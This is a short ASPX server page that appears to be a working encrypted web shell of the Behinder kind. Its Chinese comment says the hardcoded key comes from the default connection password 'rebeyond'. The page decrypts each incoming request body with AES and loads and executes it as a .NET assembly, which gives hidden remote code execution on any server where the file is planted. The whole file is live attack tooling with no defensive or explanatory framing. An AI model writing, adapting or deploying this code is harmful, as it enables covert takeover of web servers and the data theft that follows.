<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%
Session.Add("k","e45e329feb5d925b"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);
Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);
%>